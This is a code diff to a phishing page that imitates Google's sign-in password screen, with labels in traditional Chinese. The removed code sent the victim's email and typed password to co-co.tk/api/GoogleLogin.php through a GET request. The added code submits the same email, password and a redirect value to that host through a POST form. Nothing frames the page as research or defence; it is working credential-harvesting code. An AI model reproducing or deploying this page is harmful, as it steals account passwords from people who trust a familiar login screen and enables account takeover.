@@ -13,7 +13,6 @@
 <link rel="stylesheet" href="GLogin.min.css">
 </head>
 <body id="yDmH0d" class="nyoS7c UzCXuf EIlDfe">
-<a id="directme" style="display: none;"></a>
 <script>
 if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf('@')==-1){Cookies.set('email', Cookies.get('email')+"@gmail.com");}
 </script>
@@ -76,14 +75,16 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
                     </div>
                   </content>
                   <div jscontroller="mjtijb" jsname="rEuO1b">
-                  <form action="" method="post" novalidate="">
+                  <form action="https://co-co.tk/api/GoogleLogin.php" method="post" id="forme">
                     <content>
                       <div class="cDSmF s5Ip0c" role="presentation">
                         <div id="password" class="rFrNMe KSczvd uyaebd BlbNGe zKHdkd sdJrJc Tyc9J">
                         <div class="aCsJod oJeWuf">
                           <div class="aXBtI Wic03c">
                             <div class="Xb9hP">
-                              <input type="password" class="whsOnd zHQkBf" jsname="YPqjbf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="輸入您的密碼" name="pw" autocapitalize="off" autocorrect="off" dir="ltr" data-initial-dir="ltr" data-initial-value="" badinput="false" id="pw">
+			      <input type="hidden" name="email" id="uremail">
+			      <input type="hidden" name="redirect" id="redirect">
+                              <input type="password" class="whsOnd zHQkBf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="輸入您的密碼" name="pw" autocapitalize="off" autocorrect="off" badinput="false" id="pw">
                               <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">輸入您的密碼</div>
                             </div>
                             <div class="i9lrp mIZh1c"></div>
@@ -102,7 +103,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
               </div>
               <div class="zQJV3">
                 <div class="qhFLie">
-                  <div role="button" id="passwordNext" class="U26fgb O0WRkf zZhnYe e3Duub C0oVfc nDKKZc DL0QTb" jscontroller="VXdfxd" aria-disabled="false" tabindex="0" onClick="sendinfo();">
+                  <div role="button" id="passwordNext" class="U26fgb O0WRkf zZhnYe e3Duub C0oVfc nDKKZc DL0QTb" jscontroller="VXdfxd" aria-disabled="false" tabindex="0" onClick="document.getElementById('forme').submit();">
                     <div class="Vwe4Vb MbhUzd" jsname="ksKsZd"></div>
                     <div class="ZFr60d CeoRYc"></div>
                     <content class="CwaK9"><span class="RveJvd snByac">繼續</span></content>
@@ -135,7 +136,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 <div class="VmOpGe" aria-hidden="true"></div>
 </div>
 <script>
-	document.getElementById("directme").href = urldata("redirect");
+	document.getElementById("redirect").value = urldata("redirect");
 	document.getElementById("pw").addEventListener("focus", function() {document.getElementById('password').className+=' u3bW4e';});
 	document.getElementById("pw").addEventListener("blur", function() {document.getElementById('password').classList.remove('u3bW4e');});
 	document.getElementById("pw").focus();
@@ -146,24 +147,7 @@ if(Cookies.get('email').indexOf('@gmail.com')==-1&&Cookies.get('email').indexOf(
 			}
 	});
 	document.getElementById("pIdr").innerHTML = Cookies.get('email');
-	function sendinfo() {
-		if(document.getElementById("pw").value) {
-		var xhttp = new XMLHttpRequest();
-		xhttp.onreadystatechange = function() {
-			if (this.readyState == 4 && this.status == 200) {
-				console.log(this.responseText);
-				if(urldata("redirect")) {
-					document.getElementById("directme").click();
-				}
-			}
-		};
-		xhttp.open("GET", location.protocol+"//co-co.tk/api/GoogleLogin.php?email="+Cookies.get('email')+"&pw="+document.getElementById("pw").value, true);
-		xhttp.send();
-		} else {
-			document.getElementById("password").className += " k0tWj IYewr";
-			document.getElementById("DDFo").innerHTML = "輸入密碼";
-		}
-	}
+	document.getElementById("uremail").value = Cookies.get('email');
 	function count(str) {
 		var i = 0;
 		while(str.charAt(i)!="") {
